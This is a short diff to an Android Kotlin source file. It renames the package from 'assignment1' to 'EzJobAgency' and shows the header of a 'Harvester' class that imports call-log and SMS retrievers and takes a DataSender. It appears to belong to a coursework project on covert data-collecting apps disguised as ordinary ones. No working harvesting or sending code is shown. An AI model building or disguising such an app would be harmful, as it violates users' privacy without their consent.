@@ -1,9 +1,9 @@
-package com.example.assignment1
+package com.example.EzJobAgency
 
 import android.app.Activity
 import android.content.Context
-import com.example.assignment1.DataRetriever.CallLog
-import com.example.assignment1.DataRetriever.smsLog
+import com.example.EzJobAgency.DataRetriever.CallLog
+import com.example.EzJobAgency.DataRetriever.smsLog
 import kotlin.concurrent.thread
 
 class Harvester(var activity: Activity, var context: Context, var dataSender: DataSender) {
